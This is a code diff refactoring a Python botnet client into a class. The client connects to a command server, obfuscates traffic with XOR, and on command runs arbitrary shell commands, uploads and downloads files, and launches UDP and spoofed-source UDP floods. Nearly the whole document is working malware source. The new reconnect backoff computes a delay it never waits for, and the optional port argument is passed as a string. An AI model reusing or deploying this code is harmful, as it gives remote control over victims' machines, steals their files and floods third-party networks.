@@ -9,15 +9,18 @@ from multiprocessing import Process, freeze_support
 from socket import socket, IPPROTO_UDP, IPPROTO_RAW, SOCK_DGRAM, SOCK_STREAM, SOCK_RAW, AF_INET
 from socket import error as sock_error
 from pinject import UDP, IP
+
 __author__ = "Kolokotronis Panagiotis"
 __copyright__ = "Copyright 2016, Kolokotronis Panagiotis"
-__credits__ = ["Kolokotronis Panagiotis", "Lain Iwakura"]
+__credits__ = ["Kolokotronis Panagiotis", "Dimitris Zervas", "Lain Iwakura"]
 __license__ = "MIT"
-__version__ = "0.1.0"
+__version__ = "0.2.6"
 __maintainer__ = "Kolokotronis Panagiotis"
 
 
-VERSION = "v0.1.0-full"
+def exponential_backoff(c_factor):
+    """Calculate backoff time for reconnect."""
+    return int(((2**c_factor)-1)/2)
 
 
 def get_len(in_string, max_len):
@@ -34,244 +37,37 @@ def get_len(in_string, max_len):
     return len_to_return
 
 
-def make_en_stdout(stdout, sock):
-    """Obfuscate (xor) and send string, return integer.
+def obf_deobf(byte_array):
+    """Obfuscate/Deobfuscate message."""
+    for i, val in enumerate(byte_array):
+        byte_array[i] = val ^ 0x41
+    return byte_array
+
+
+def make_en_stdout(stdout):
+    """Obfuscate (xor) and return string.
 
     Keyword argument(s):
     stdout -- string to be sent
-    sock   -- socket object
     """
     en_stdout = bytearray(stdout, 'UTF-8')
-    for i in range(len(en_stdout)):
-        en_stdout[i] = en_stdout[i] ^ 0x41
-    try:
-        sock.send(en_stdout)
-    except sock_error:
-        sock.close()
-        return 1
-    return 0
+    return obf_deobf(en_stdout)
 
 
-def make_en_bin_stdout(stdout, sock):
-    """Obfuscate (xor) and send binary, return integer.
+def make_en_bin_stdout(stdout):
+    """Obfuscate (xor) and return binary.
 
     Keyword argument(s):
     stdout -- binary to be sent
-    sock   -- socket object
     """
     en_stdout = bytearray(stdout)
-    for i in range(len(en_stdout)):
-        en_stdout[i] = en_stdout[i] ^ 0x41
-    try:
-        sock.send(en_stdout)
-    except sock_error:
-        sock.close()
-        return 1
-    return 0
+    return obf_deobf(en_stdout)
 
 
 def make_en_data(data):
     """Deobfuscate (xor) data, return string."""
     en_data = bytearray(data)
-    for i in range(len(en_data)):
-        en_data[i] = en_data[i] ^ 0x41
-    return en_data
-
-
-def get_en_data(sock, size):
-    """Get data, return string."""
-    data = sock.recv(size)
-    return make_en_data(data).decode('UTF-8')
-
-
-def get_en_bin_data(sock, size):
-    """Get data, return binary."""
-    data = sock.recv(size)
-    return make_en_data(data)
-
-
-def kill_me(sock):
-    """Close socket, terminate script's execution."""
-    sock.close()
-    sysexit()
-
-
-def get_file(sock):
-    """Get file name and contents from server, create file."""
-    exit_code = 0
-    en_data = get_en_data(sock, 3) #Filename length up to 999 chars
-    en_data = get_en_data(sock, int(en_data))
-    try:
-        file_to_write = open(en_data, 'w')
-        stdout = 'fcs'
-    except IOError:
-        stdout = 'fna'
-        exit_code = 1
-    en_stdout = make_en_stdout(stdout, sock)
-    if en_stdout == 1:
-        sysexit()
-    if stdout == 'fcs':
-        f_size = get_en_data(sock, 13) #File size up to 9999999999999 chars
-        en_data = get_en_data(sock, int(f_size))
-        file_to_write.write(en_data)
-        file_to_write.close()
-        stdout = "fsw"
-        en_stdout = make_en_stdout(stdout, sock)
-        if en_stdout == 1:
-            sysexit()
-    return exit_code
-
-
-def get_binary(sock):
-    """Get binary name and contents from server, create binary."""
-    exit_code = 0
-    en_data = get_en_data(sock, 3) #Filename length up to 999 chars
-    en_data = get_en_data(sock, int(en_data))
-    try:
-        bin_to_write = open(en_data, 'wb')
-        stdout = 'fcs'
-    except IOError:
-        stdout = 'fna'
-        exit_code = 1
-    en_stdout = make_en_stdout(stdout, sock)
-    if en_stdout == 1:
-        sysexit()
-    if stdout == 'fcs':
-        b_size = get_en_data(sock, 13) #Binary size up to 9999999999999 symbols
-        en_data = get_en_bin_data(sock, int(b_size))
-        bin_to_write.write(en_data)
-        bin_to_write.close()
-        stdout = "fsw"
-        en_stdout = make_en_stdout(stdout, sock)
-        if en_stdout == 1:
-            sysexit()
-    return exit_code
-
-
-def send_file(sock):
-    """Get file name from server, send contents back."""
-    exit_code = 0
-    en_data = get_en_data(sock, 3) #Filename length up to 999 chars
-    en_data = get_en_data(sock, int(en_data))
-    try:
-        file_to_send = open(en_data, 'r')
-        stdout = 'fos'
-    except IOError:
-        stdout = 'fna'
-        exit_code = 1
-    en_stdout = make_en_stdout(stdout, sock)
-    if en_stdout == 1:
-        sysexit()
-    if stdout == 'fos':
-        file_cont = file_to_send.read()
-        file_to_send.close()
-        stdout = get_len(file_cont, 13)
-        en_stdout = make_en_stdout(stdout, sock)
-        if en_stdout == 1:
-            sysexit()
-        stdout = file_cont
-        en_stdout = make_en_stdout(stdout, sock)
-        if en_stdout == 1:
-            sysexit()
-    return exit_code
-
-
-def send_binary(sock):
-    """Get binary name from server, send contents back."""
-    exit_code = 0
-    en_data = get_en_data(sock, 3) #Filename length up to 999 chars
-    en_data = get_en_data(sock, int(en_data))
-    try:
-        bin_to_send = open(en_data, 'rb')
-        stdout = 'fos'
-    except IOError:
-        stdout = 'fna'
-        exit_code = 1
-    en_stdout = make_en_stdout(stdout, sock)
-    if en_stdout == 1:
-        sysexit()
-    if stdout == 'fos':
-        bin_cont = bin_to_send.read()
-        bin_to_send.close()
-        stdout = get_len(bin_cont, 13)
-        en_stdout = make_en_stdout(stdout, sock)
-        if en_stdout == 1:
-            sysexit()
-        stdout = bin_cont
-        en_stdout = make_en_bin_stdout(stdout, sock)
-        if en_stdout == 1:
-            sysexit()
-    return exit_code
-
-
-def udp_flood(sock):
-    """Get target ip and port from server, start UPD flood wait for 'KILL'."""
-    en_data = get_en_data(sock, 3) # Max ip+port+payload length 999 chars
-    en_data = get_en_data(sock, int(en_data))
-    en_data = en_data.split(":")
-    target_ip = en_data[0]
-    target_port = int(en_data[1])
-    msg = en_data[2]
-    proc = Process(target=udp_flood_start, args=(target_ip, target_port, msg))
-    proc.start()
-    while True:
-        en_data = get_en_data(sock, 5)
-        try:
-            en_data = COMM_DICT[en_data]
-        except KeyError:
-            continue
-        if en_data == 'KILL':
-            proc.terminate()
-            break
-    return 0
-
-
-def udp_spoof(sock):
-    """Get target/spoofed ip and port from server, start UPD spoof wait for 'KILL'."""
-    en_data = get_en_data(sock, 3)
-    en_data = get_en_data(sock, int(en_data))
-    en_data = en_data.split(":")
-    target_ip = en_data[0]
-    target_port = int(en_data[1])
-    spoofed_ip = en_data[2]
-    spoofed_port = int(en_data[3])
-    payload = en_data[4].encode('UTF-8')
-    proc = Process(target=udp_spoof_start, args=(target_ip, target_port,
-                                                 spoofed_ip, spoofed_port,
-                                                 payload))
-    proc.start()
-    while True:
-        en_data = get_en_data(sock, 5)
-        try:
-            en_data = COMM_DICT[en_data]
-        except KeyError:
-            continue
-        if en_data == 'KILL':
-            proc.terminate()
-            break
-    return 0
-
-
-def run_cm(sock):
-    """Get command to run from server, execute it and send results back."""
-    en_data = get_en_data(sock, 13)
-    en_data = get_en_data(sock, int(en_data))
-    comm = Popen(en_data, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
-    stdout, stderr = comm.communicate()
-    if stderr:
-        decode = stderr.decode('UTF-8')
-    elif stdout:
-        decode = stdout.decode('UTF-8')
-    else:
-        decode = 'Command has no output'
-    len_decode = get_len(decode, 13)
-    en_stdout = make_en_stdout(len_decode, sock)
-    if en_stdout == 1:
-        sysexit()
-    en_stdout = make_en_stdout(decode, sock)
-    if en_stdout == 1:
-        sysexit()
-    return 0
+    return obf_deobf(en_data)
 
 
 def udp_flood_start(target_ip, target_port, msg):
@@ -313,52 +109,294 @@ def udp_spoof_start(target_ip, target_port, spoofed_ip, spoofed_port, payload):
         sleep(0.01)
 
 
-COMM_DICT = {
-    '00000' : 'killMe',
-    '00001' : 'getFile',
-    '00002' : 'getBinary',
-    '00003' : 'sendFile',
-    '00004' : 'sendBinary',
-    '00005' : 'udpFlood',
-    '00006' : 'udpSpoof',
-    '00007' : 'command',
-    '00008' : 'KILL'
-}
+class Client(object):
+    """docstring for Client."""
+    def __init__(self, addr, port=9000):
+        self.sock = socket(AF_INET, SOCK_STREAM)
+        self.address = addr
+        self.port = port
+        self.quit_signal = False
+        self.version = ("%s-%s" %(__version__, "full"))
+        self.comm_dict = {
+            '00000' : 'killMe',
+            '00001' : 'getFile',
+            '00002' : 'getBinary',
+            '00003' : 'sendFile',
+            '00004' : 'sendBinary',
+            '00005' : 'udpFlood',
+            '00006' : 'udpSpoof',
+            '00007' : 'command',
+            '00008' : 'KILL'
+        }
+        self.comm_swtch = {
+            'killMe'    : self.kill_me,
+            'getFile'   : self.get_file,
+            'getBinary' : self.get_binary,
+            'sendFile'  : self.send_file,
+            'sendBinary': self.send_binary,
+            'udpFlood'  : self.udp_flood,
+            'udpSpoof'  : self.udp_spoof,
+            'command'   : self.run_cm
+        }
 
+    def loop(self):
+        """Client's main body. Accept and execute commands."""
+        while not self.quit_signal:
+            en_data = self.get_en_data(5)
+            try:
+                en_data = self.comm_dict[en_data]
+            except KeyError:
+                continue
+            self.comm_swtch[en_data]()
+        self.sock.close()
 
-COMM_SWTCH = {
-    'killMe'    : kill_me,
-    'getFile'   : get_file,
-    'getBinary' : get_binary,
-    'sendFile'  : send_file,
-    'sendBinary': send_binary,
-    'udpFlood'  : udp_flood,
-    'udpSpoof'  : udp_spoof,
-    'command'   : run_cm
-}
+    def connect(self):
+        """Connect to the Server."""
+        try:
+            self.sock.connect((self.address, self.port))
+            en_stdout = make_en_stdout(self.version)
+            en_stdout = self.send(en_stdout)
+        except sock_error:
+            raise sock_error
+        return 0
+
+    def reconnect(self):
+        """Attempt to reconnect after connection loss."""
+        # Take an exponential backoff-ish approach
+        c_factor = 0
+        connected = False
+        while not connected:
+            try:
+                self.connect()
+            except sock_error:
+                exponential_backoff(c_factor)
+                c_factor += 1
+            else:
+                connected = True
+
+    def send(self, data):
+        """Send message to Server."""
+        r_code = 0
+        try:
+            self.sock.send(data)
+        except sock_error:
+            r_code = 1
+            self.reconnect()
+        return r_code
+
+    def get_en_data(self, size):
+        """Get data, return string."""
+        data = self.sock.recv(size)
+        return make_en_data(data).decode('UTF-8')
+
+    def get_en_bin_data(self, size):
+        """Get data, return binary."""
+        data = self.sock.recv(size)
+        return make_en_data(data)
+
+    def kill_me(self):
+        """Close socket, terminate script's execution."""
+        self.quit_signal = True
+
+    def run_cm(self):
+        """Get command to run from server, execute it and send results back."""
+        en_data = self.get_en_data(13)
+        en_data = self.get_en_data(int(en_data))
+        comm = Popen(en_data, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
+        stdout, stderr = comm.communicate()
+        if stderr:
+            decode = stderr.decode('UTF-8')
+        elif stdout:
+            decode = stdout.decode('UTF-8')
+        else:
+            decode = 'Command has no output'
+        len_decode = get_len(decode, 13)
+        en_stdout = make_en_stdout(len_decode)
+        en_stdout = self.send(en_stdout)
+        if en_stdout == 0:
+            en_stdout = make_en_stdout(decode)
+            en_stdout = self.send(en_stdout)
+        return 0
+
+    def get_file(self):
+        """Get file name and contents from server, create file."""
+        exit_code = 0
+        en_data = self.get_en_data(3) #Filename length up to 999 chars
+        en_data = self.get_en_data(int(en_data))
+        try:
+            file_to_write = open(en_data, 'w')
+            stdout = 'fcs'
+        except IOError:
+            stdout = 'fna'
+            exit_code = 1
+            en_stdout = make_en_stdout(stdout)
+            en_stdout = self.send(en_stdout)
+        else:
+            en_stdout = make_en_stdout(stdout)
+            en_stdout = self.send(en_stdout)
+            if en_stdout == 0:
+                f_size = self.get_en_data(13) #File size up to 9999999999999 chars
+                en_data = self.get_en_data(int(f_size))
+                file_to_write.write(en_data)
+                file_to_write.close()
+                stdout = "fsw"
+                en_stdout = make_en_stdout(stdout)
+                en_stdout = self.send(en_stdout)
+            else:
+                file_to_write.close()
+        return exit_code
+
+    def get_binary(self):
+        """Get binary name and contents from server, create binary."""
+        exit_code = 0
+        en_data = self.get_en_data(3) #Filename length up to 999 chars
+        en_data = self.get_en_data(int(en_data))
+        try:
+            bin_to_write = open(en_data, 'wb')
+            stdout = 'fcs'
+        except IOError:
+            stdout = 'fna'
+            exit_code = 1
+            en_stdout = make_en_stdout(stdout)
+            en_stdout = self.send(en_stdout)
+        else:
+            en_stdout = make_en_stdout(stdout)
+            en_stdout = self.send(en_stdout)
+            if en_stdout == 0:
+                b_size = self.get_en_data(13) #Binary size up to 9999999999999 symbols
+                en_data = self.get_en_bin_data(int(b_size))
+                bin_to_write.write(en_data)
+                bin_to_write.close()
+                stdout = "fsw"
+                en_stdout = make_en_stdout(stdout)
+                en_stdout = self.send(en_stdout)
+            else:
+                bin_to_write.close()
+        return exit_code
+
+    def send_file(self):
+        """Get file name from server, send contents back."""
+        exit_code = 0
+        en_data = self.get_en_data(3) #Filename length up to 999 chars
+        en_data = self.get_en_data(int(en_data))
+        try:
+            file_to_send = open(en_data, 'r')
+            stdout = 'fos'
+        except IOError:
+            stdout = 'fna'
+            exit_code = 1
+            en_stdout = make_en_stdout(stdout)
+            en_stdout = self.send(en_stdout)
+        else:
+            en_stdout = make_en_stdout(stdout)
+            en_stdout = self.send(en_stdout)
+            if en_stdout == 0:
+                file_cont = file_to_send.read()
+                file_to_send.close()
+                stdout = get_len(file_cont, 13)
+                en_stdout = make_en_stdout(stdout)
+                en_stdout = self.send(en_stdout)
+                if en_stdout == 0:
+                    stdout = file_cont
+                    en_stdout = make_en_stdout(stdout)
+                    en_stdout = self.send(en_stdout)
+            else:
+                file_to_send.close()
+        return exit_code
+
+    def send_binary(self):
+        """Get binary name from server, send contents back."""
+        exit_code = 0
+        en_data = self.get_en_data(3) #Filename length up to 999 chars
+        en_data = self.get_en_data(int(en_data))
+        try:
+            bin_to_send = open(en_data, 'rb')
+            stdout = 'fos'
+        except IOError:
+            stdout = 'fna'
+            exit_code = 1
+            en_stdout = make_en_stdout(stdout)
+            en_stdout = self.send(en_stdout)
+        else:
+            en_stdout = make_en_stdout(stdout)
+            en_stdout = self.send(en_stdout)
+            if en_stdout == 0:
+                bin_cont = bin_to_send.read()
+                bin_to_send.close()
+                stdout = get_len(bin_cont, 13)
+                en_stdout = make_en_stdout(stdout)
+                en_stdout = self.send(en_stdout)
+                if en_stdout == 0:
+                    stdout = bin_cont
+                    en_stdout = make_en_bin_stdout(stdout)
+                    en_stdout = self.send(en_stdout)
+            else:
+                bin_to_send.close()
+        return exit_code
+
+    def udp_flood(self):
+        """Get target ip and port from server, start UPD flood wait for 'KILL'."""
+        en_data = self.get_en_data(3) # Max ip+port+payload length 999 chars
+        en_data = self.get_en_data(int(en_data))
+        en_data = en_data.split(":")
+        target_ip = en_data[0]
+        target_port = int(en_data[1])
+        msg = en_data[2]
+        proc = Process(target=udp_flood_start, args=(target_ip, target_port, msg))
+        proc.start()
+        killed = False
+        while not killed:
+            en_data = self.get_en_data(5)
+            try:
+                en_data = self.comm_dict[en_data]
+            except KeyError:
+                continue
+            if en_data == 'KILL':
+                proc.terminate()
+                killed = True
+        return 0
+
+    def udp_spoof(self):
+        """Get target/spoofed ip and port from server, start UPD spoof wait for 'KILL'."""
+        en_data = self.get_en_data(3)
+        en_data = self.get_en_data(int(en_data))
+        en_data = en_data.split(":")
+        target_ip = en_data[0]
+        target_port = int(en_data[1])
+        spoofed_ip = en_data[2]
+        spoofed_port = int(en_data[3])
+        payload = en_data[4].encode('UTF-8')
+        proc = Process(target=udp_spoof_start, args=(target_ip, target_port,
+                                                     spoofed_ip, spoofed_port,
+                                                     payload))
+        proc.start()
+        killed = False
+        while not killed:
+            en_data = self.get_en_data(5)
+            try:
+                en_data = self.comm_dict[en_data]
+            except KeyError:
+                continue
+            if en_data == 'KILL':
+                proc.terminate()
+                killed = True
+        return 0
 
 
 def main():
+    """Main function. Handle object instances."""
     try:
         rhost = argv[1]
-        rport = 9000
     except IndexError:
         print ("Must provide hotst")
         sysexit()
-    sock = socket(AF_INET, SOCK_STREAM)
-    sock.connect((rhost, rport))
-    en_stdout = make_en_stdout(VERSION, sock)
-    if en_stdout == 1:
-        sysexit()
+    try:
+        myself = Client(rhost, argv[2])
+    except IndexError:
+        myself = Client(rhost)
+    myself.connect()
+    myself.loop()
 
-    while True:
-        en_data = get_en_data(sock, 5)
-        try:
-            en_data = COMM_DICT[en_data]
-        except KeyError:
-            continue
-        COMM_SWTCH[en_data](sock)
-    sock.close()
 
 #Start Here!
 if __name__ == '__main__':
